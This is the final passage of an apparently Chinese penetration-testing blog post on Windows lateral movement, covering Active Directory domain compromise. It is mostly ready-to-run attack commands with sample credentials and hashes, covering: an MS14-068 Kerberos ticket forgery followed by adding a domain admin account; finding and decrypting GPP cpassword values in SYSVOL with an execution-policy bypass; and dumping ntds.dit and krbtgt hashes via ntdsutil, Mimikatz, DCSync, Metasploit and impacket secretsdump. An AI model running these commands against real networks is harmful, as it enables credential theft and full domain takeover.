<h3 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">登录普通域用户mssql，cmd中输入<span class="string">"whoami/user"</span>获取sid  </span><br><span class="line">de1ay\mssql S-1-5-21-2756371121-2868759905-3853650604-2103</span><br><span class="line"></span><br><span class="line">ms14-068.exe -u mssql@de1ay.com -p 1qaz@WSX -s S-1-5-21-2756371121-2868759905-3853650604-2103 -d dc.de1ay.com  </span><br><span class="line"></span><br><span class="line">Mimikatz.exe <span class="string">"kerberos::ptc TGT_mssql@de1ay.com.ccache"</span> exit</span><br><span class="line"></span><br><span class="line">net use \\dc\admin$  </span><br><span class="line"></span><br><span class="line">dir \\dc\c$</span><br><span class="line"></span><br><span class="line">pstools 添加域管，导出密码</span><br><span class="line">net<span class="built_in"> user </span>wangergou ABCabc123 /<span class="builtin-name">add</span> /domain</span><br><span class="line">net<span class="built_in"> group </span><span class="string">"Domain admins"</span> wangergou /<span class="builtin-name">add</span> /domain</span><br></pre></td></tr></table></figure>

<h3 id="GPP漏洞利用"><a href="#GPP漏洞利用" class="headerlink" title="GPP漏洞利用"></a>GPP漏洞利用</h3><hr>
<p>win2008增加，一般域用户都可访问敏感文件<br>密码存在SYSCOL目录下:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Groups</span>.</span></span>xml, 这个文件是域管通过GPP设置或修改本地密码留下的</span><br><span class="line">Services\<span class="module-access"><span class="module"><span class="identifier">Services</span>.</span></span>xml,</span><br><span class="line">ScheduledTasks\<span class="module-access"><span class="module"><span class="identifier">ScheduledTasks</span>.</span></span>xml,</span><br><span class="line">Printers\<span class="module-access"><span class="module"><span class="identifier">Printers</span>.</span></span>xml,</span><br><span class="line">Drives\<span class="module-access"><span class="module"><span class="identifier">Drives</span>.</span></span>xml,</span><br><span class="line">DataSources\<span class="module-access"><span class="module"><span class="identifier">DataSources</span>.</span></span>xml</span><br><span class="line">net use \\域控(如pc.xx.com) password /user:xxx.com\username </span><br><span class="line">dir \\域控\SYSVOL /s /a &gt; sysvol.txt</span><br><span class="line">findstr /i <span class="string">"groups.xml"</span> sysvol.txt</span><br></pre></td></tr></table></figure>

<p>找到cpassword<br>解密过程：</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set-executionPolicy</span> <span class="string">bypass</span></span><br><span class="line"><span class="string">powershell </span>-<span class="string">ep </span><span class="string">bypass </span>    启动<span class="string">ps</span></span><br><span class="line"><span class="string">Import-</span><span class="string">Module </span>.\<span class="string">GPP.</span><span class="string">ps1</span></span><br><span class="line"><span class="string">Get-</span><span class="string">DecryptedCpassword </span> <span class="string">xxxxxxxxxxxxxx</span></span><br></pre></td></tr></table></figure>

<h3 id="导出域控ntds-dit"><a href="#导出域控ntds-dit" class="headerlink" title="导出域控ntds.dit"></a>导出域控ntds.dit</h3><ul>
<li>交互式<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate<span class="built_in"> instance </span>ntds</span><br><span class="line">ifm</span><br><span class="line">create full C:\ntdsutil</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></li>
<li>mimikatz</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">privilege::debug lsadump::lsa /inject</span><br></pre></td></tr></table></figure>
<ul>
<li>invoke-dcsync</li>
</ul>
<p><code>Invoke-DCSync -PWDumpFormat</code></p>
<ul>
<li>远程</li>
</ul>
<figure class="highlight golo"><table><tr><td class="code"><pre><span class="line">先导入域控krbtgt的ticket(kekeo)</span><br><span class="line">kekeo <span class="string">"tgt::ask /user:dbadmin /domain:offensive.local /ntlm:4aa0f66b8059750e6e410122cdf05ce2"</span></span><br><span class="line"> &gt; Ticket <span class="keyword">in</span> file 'TGT_dbadmin<span class="meta">@OFFENSIVE</span>.LOCAL_krbtgt~offensive.<span class="keyword">local</span><span class="meta">@OFFENSIVE</span>.LOCAL.kirbi'</span><br><span class="line"> </span><br><span class="line">kekeo <span class="string">"kerberos::ptt TGT_dbadmin@OFFENSIVE.LOCAL_krbtgt~offensive.local@OFFENSIVE.LOCAL.kirbi"</span></span><br><span class="line">* File: 'TGT_administrator<span class="meta">@OFFENSIVE</span>.LOCAL_krbtgt~offensive.<span class="keyword">local</span><span class="meta">@OFFENSIVE</span>.LOCAL.kirbi': OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:offensive.<span class="keyword">local</span> /all /csv</span><br><span class="line">lsadump::dcsync /domain:offensive.<span class="keyword">local</span> /user:krbtgt</span><br></pre></td></tr></table></figure>

<ul>
<li>msf</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/<span class="keyword">admin</span>/smb/psexec_ntdsgrab</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> windows/gather/credentials/domain_hashdump</span><br></pre></td></tr></table></figure>
<ul>
<li>impacket</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">0f</span>49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc$@<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#入口点"><span class="toc-number">1.</span> <span class="toc-text">入口点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权-amp-降权"><span class="toc-number">2.</span> <span class="toc-text">提权&amp;降权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#降权"><span class="toc-number">2.1.</span> <span class="toc-text">降权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-number">2.2.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程执行命令方法"><span class="toc-number">3.</span> <span class="toc-text">远程执行命令方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工作组渗透"><span class="toc-number">4.</span> <span class="toc-text">工作组渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码喷射"><span class="toc-number">4.1.</span> <span class="toc-text">密码喷射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-010-08-067等溢出漏洞"><span class="toc-number">4.2.</span> <span class="toc-text">17-010,08-067等溢出漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常规web-服务渗透"><span class="toc-number">4.3.</span> <span class="toc-text">常规web,服务渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常见应用漏洞："><span class="toc-number">4.3.1.</span> <span class="toc-text">常见应用漏洞：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常见语言反序列化漏洞"><span class="toc-number">4.3.2.</span> <span class="toc-text">常见语言反序列化漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库漏洞及配置不当"><span class="toc-number">4.3.3.</span> <span class="toc-text">数据库漏洞及配置不当</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）"><span class="toc-number">4.3.4.</span> <span class="toc-text">web应用、及数据库中寻找其他服务器密码信息（ftp、mail、smb、ldap存储、sql…）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统备份文件（ghost）中读密码"><span class="toc-number">4.4.</span> <span class="toc-text">系统备份文件（ghost）中读密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlm-relay"><span class="toc-number">4.5.</span> <span class="toc-text">ntlm relay</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域渗透"><span class="toc-number">5.</span> <span class="toc-text">域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pth"><span class="toc-number">5.1.</span> <span class="toc-text">pth</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptt"><span class="toc-number">5.2.</span> <span class="toc-text">ptt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#金票"><span class="toc-number">5.3.</span> <span class="toc-text">金票</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#银票"><span class="toc-number">5.4.</span> <span class="toc-text">银票</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068"><span class="toc-number">5.5.</span> <span class="toc-text">ms14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPP漏洞利用"><span class="toc-number">5.6.</span> <span class="toc-text">GPP漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#导出域控ntds-dit"><span class="toc-number">5.7.</span> <span class="toc-text">导出域控ntds.dit</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&text=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&is_video=false&description=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=windows横向扩展tips&body=Check out this article: http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&title=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&name=windows横向扩展tips&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/03/04/windows%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95tips/&t=windows横向扩展tips" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 ceeeeeeb
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
